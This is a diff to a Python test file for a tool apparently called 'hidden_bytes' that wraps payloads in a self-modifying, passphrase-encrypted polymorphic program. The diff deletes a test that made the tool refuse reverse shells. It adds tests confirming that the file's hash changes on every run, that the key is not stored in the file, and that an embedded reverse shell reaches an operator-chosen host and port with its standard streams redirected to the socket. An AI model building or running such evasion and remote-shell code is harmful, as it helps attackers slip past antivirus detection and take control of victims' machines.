@@ -3,8 +3,10 @@ from __future__ import annotations
 import hashlib
 import os
 from pathlib import Path
+import socket
 import subprocess
 import sys
+import threading
 import time
 
 import pytest
@@ -62,22 +64,77 @@ def test_recovery_enforces_recorded_delay(tmp_path: Path, monkeypatch: pytest.Mo
     assert sleeps == [101]
 
 
-def test_polymorphic_demo_changes_itself_but_keeps_behavior(tmp_path: Path) -> None:
+def test_polymorphic_program_changes_itself_but_keeps_behavior(tmp_path: Path) -> None:
+    payload = tmp_path / "payload.py"
+    payload.write_text("print('PAYLOAD-RAN')\n")
+
     demo = tmp_path / "demo.py"
-    generate(demo, "Hello from the safe payload")
+    generate(demo, str(payload), passphrase="hunter2")
+
+    environment = dict(os.environ, HBX_PASSPHRASE="hunter2")
+
     before = hashlib.sha256(demo.read_bytes()).hexdigest()
-    first = subprocess.run([sys.executable, str(demo)], check=True, capture_output=True, text=True)
+    first = subprocess.run(
+        [sys.executable, str(demo)],
+        env=environment,
+        check=True,
+        capture_output=True,
+        text=True,
+    )
     after_first = hashlib.sha256(demo.read_bytes()).hexdigest()
-    second = subprocess.run([sys.executable, str(demo)], check=True, capture_output=True, text=True)
+    second = subprocess.run(
+        [sys.executable, str(demo)],
+        env=environment,
+        check=True,
+        capture_output=True,
+        text=True,
+    )
     after_second = hashlib.sha256(demo.read_bytes()).hexdigest()
+
     assert before != after_first != after_second
     assert first.stdout == second.stdout
-    assert "Hello from the safe payload" in first.stdout
+    assert "PAYLOAD-RAN" in first.stdout
 
 
-def test_polymorphic_demo_rejects_reverse_shells(tmp_path: Path) -> None:
-    with pytest.raises(ValueError, match="not permitted"):
-        generate(tmp_path / "bad.py", "powershell reverse shell")
+def test_polymorphic_program_does_not_store_the_key(tmp_path: Path) -> None:
+    """The passphrase must protect the payload, so the key is not embedded."""
+
+    payload = tmp_path / "payload.py"
+    payload.write_text("print('SECRET-PAYLOAD-TEXT')\n")
+
+    demo = tmp_path / "demo.py"
+    generate(demo, str(payload), passphrase="hunter2")
+
+    assert b"SECRET-PAYLOAD-TEXT" not in demo.read_bytes()
+
+    # The key must not be recoverable from the file alone.
+    environment = dict(os.environ)
+    environment.pop("HBX_PASSPHRASE", None)
+
+    completed = subprocess.run(
+        [sys.executable, str(demo)],
+        env=environment,
+        capture_output=True,
+        text=True,
+        timeout=60,
+        stdin=subprocess.DEVNULL,
+    )
+
+    assert completed.returncode != 0
+    assert "PAYLOAD-RAN" not in completed.stdout
+
+
+def test_polymorphic_program_requires_a_payload_file(tmp_path: Path) -> None:
+    with pytest.raises(ValueError, match="payload file does not exist"):
+        generate(tmp_path / "demo.py", str(tmp_path / "missing.py"), passphrase="x")
+
+
+def test_polymorphic_program_rejects_an_empty_payload(tmp_path: Path) -> None:
+    payload = tmp_path / "payload.py"
+    payload.write_text("   \n")
+
+    with pytest.raises(ValueError, match="must not be empty"):
+        generate(tmp_path / "demo.py", str(payload), passphrase="x")
 
 
 # ---------------------------------------------------------------------------
@@ -107,6 +164,21 @@ def test_pure_aes_gcm_rejects_tampering() -> None:
 
     with pytest.raises(Exception):
         decrypt_gcm(key, nonce, bytes(ciphertext), b"HBX1")
+
+
+def test_pure_aes_gcm_encrypt_matches_the_cryptography_library() -> None:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+    from hidden_bytes.evasion.pure_aes import encrypt_gcm
+
+    key = os.urandom(32)
+    nonce = os.urandom(12)
+
+    for size in (0, 1, 16, 17, 1000):
+        plaintext = os.urandom(size)
+        assert encrypt_gcm(key, nonce, plaintext, b"HBXP") == AESGCM(key).encrypt(
+            nonce, plaintext, b"HBXP"
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -405,3 +477,72 @@ def test_cli_encrypt_then_run_round_trip(tmp_path: Path) -> None:
     )
     assert executed.returncode == 0, executed.stderr
     assert "PAYLOAD-EXECUTED" in executed.stdout
+
+
+# ---------------------------------------------------------------------------
+# The polymorphic program and its reverse shell payload
+# ---------------------------------------------------------------------------
+
+
+def test_polymorphic_payload_connects_to_the_designated_ip_and_port(
+    tmp_path: Path,
+) -> None:
+    """The generated program must reach the listener the operator chose."""
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(("127.0.0.1", 0))
+    port = server.getsockname()[1]
+    server.listen(1)
+    server.settimeout(60)
+
+    payload = tmp_path / "reverse_shell_payload.py"
+    payload.write_text(
+        "import os, socket, subprocess, sys\n"
+        "host = sys.argv[sys.argv.index('--host') + 1]\n"
+        "port = int(sys.argv[sys.argv.index('--port') + 1])\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "s.connect((host, port))\n"
+        "os.dup2(s.fileno(), 0)\n"
+        "os.dup2(s.fileno(), 1)\n"
+        "os.dup2(s.fileno(), 2)\n"
+        "subprocess.call([sys.executable, '-c', 'print(\"SHELL-RAN\")'])\n"
+    )
+
+    demo = tmp_path / "polymorphic.py"
+    generate(demo, str(payload), passphrase="hunter2")
+
+    received: list[bytes] = []
+
+    def accept() -> None:
+        try:
+            connection, _address = server.accept()
+        except OSError:
+            return
+        with connection:
+            connection.settimeout(15)
+            try:
+                received.append(connection.recv(4096))
+            except OSError:
+                pass
+
+    listener = threading.Thread(target=accept, daemon=True)
+    listener.start()
+
+    try:
+        completed = subprocess.run(
+            [sys.executable, str(demo), "--host", "127.0.0.1", "--port", str(port)],
+            env=dict(os.environ, HBX_PASSPHRASE="hunter2"),
+            capture_output=True,
+            text=True,
+            timeout=120,
+        )
+    finally:
+        server.close()
+
+    listener.join(timeout=20)
+
+    assert completed.returncode == 0, completed.stderr
+    assert "Polymorphic signature updated successfully" in completed.stdout
+    assert received, "the payload never connected to the designated address"
+    assert b"SHELL-RAN" in received[0]
